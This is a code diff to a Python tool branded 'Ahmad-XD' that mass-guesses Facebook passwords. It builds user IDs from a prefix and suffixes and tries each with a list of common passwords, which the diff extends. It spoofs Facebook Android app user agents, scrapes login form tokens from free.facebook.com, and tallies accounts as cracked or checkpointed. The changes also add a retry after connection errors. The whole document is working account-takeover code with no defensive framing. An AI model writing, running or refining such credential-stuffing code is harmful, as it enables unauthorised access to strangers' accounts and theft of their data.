@@ -163,7 +163,7 @@ def method1():
 		print ("")
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,uid,'khan123','khan12345','khan']
+			pwx = [guru,uid,'khan123','khan12345','khankhan','57273200','57575751','59039200']
 			yaari.submit(mcrack,uid,pwx,tl)
 	print(47*'-')
 	print ("")
@@ -181,12 +181,12 @@ def mcrack(uid,pwx,tl):
 	global agents
 	try:
 		for ps in pwx:
-			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/382.0.0.20.105;FBPN/com.facebook.orca;FBLC/en_US;FBBV/407547524;FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2001;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2199};FB_FW/1;]" 
+			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537828;FBDM/{density=1.75,width=720,height=1396};FBLC/en_GB;FBRV/387081651;FBCR/life:) BY;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537773;FBDM/{density=2.0,width=720,height=1360};FBLC/en_GB;FBRV/0;FBCR/Lycamobile;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
 			session = requests.Session()
 			sys.stdout.write(f'\r [Ahmad-XD] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
 			sys.stdout.flush()
 			pro = (ua)
-			free_fb = session.get('https://m.facebook.com/?tbua=1').text
+			free_fb = session.get('https://free.facebook.com/?tbua=1').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -234,7 +234,9 @@ def mcrack(uid,pwx,tl):
 			else:
 				continue
 		loop+=1
-	except:
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
 		pass
 	
 
@@ -267,7 +269,7 @@ def method2():
 		print ("")
 		for guru in user:
 			uid = kode+guru
-			pwx = [guru,uid,'khan123','khan12345','khankhan']
+			pwx = [guru,uid,'khan123','khan12345','khankhan','57273200','57575751','59039200']
 			yaari.submit(mbcrack,uid,pwx,tl)
 	print(47*'-')
 	print ("")
@@ -285,12 +287,12 @@ def mbcrack(uid,pwx,tl):
 	global QADIR
 	try:
 		for ps in pwx:
-			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/Orca-Android;FBAV/382.0.0.20.105;FBPN/com.facebook.orca;FBLC/en_US;FBBV/407547524;FBCR/Grameenphone;FBMF/OPPO;FBBD/OPPO;FBDV/CPH2001;FBSV/11;FBCA/arm64-v8a:null;FBDM/{density=3.0,width=1080,height=2199};FB_FW/1;]" 
+			ua  = "[FBAN/FB4A;FBAV/"+str(random.randint(11,77))+'.0.0.'+str(random.randrange(9,49))+str(random.randint(11,77)) +";FBBV/"+str(random.randint(1111111,7777777))+";[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537828;FBDM/{density=1.75,width=720,height=1396};FBLC/en_GB;FBRV/387081651;FBCR/life:) BY;FBMF/samsung;FBBD/samsung;FBPN/com.facebook.katana;FBDV/SM-J810F;FBSV/10;FBOP/19;FBCA/armeabi-v7a:armeabi;]','[FBAN/FB4A;FBAV/377.0.0.22.107;FBBV/385537773;FBDM/{density=2.0,width=720,height=1360};FBLC/en_GB;FBRV/0;FBCR/Lycamobile;FBMF/HUAWEI;FBBD/HUAWEI;FBPN/com.facebook.katana;FBDV/LDN-L21;FBSV/8.0.0;FBOP/19;FBCA/armeabi-v7a:armeabi;]"
 			session = requests.Session()
 			sys.stdout.write(f'\r [AHMAD-XD] [%s/%s] [OK][%s] [CP][%s] \r'%(loop,tl,len(ok),len(cp))),
 			sys.stdout.flush()
 			pro = (ua)
-			free_fb = session.get('https://p.facebook.com').text
+			free_fb = session.get('https://free.facebook.com').text
 			log_data = {
 				"lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
 			"jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
@@ -342,7 +344,9 @@ def mbcrack(uid,pwx,tl):
 			else:
 				continue
 		loop+=1
-	except:
+	except requests.exceptions.ConnectionError:
+		time.sleep(20)
+	except Exception as e:
 		pass
 	
 if __name__=='__main__':
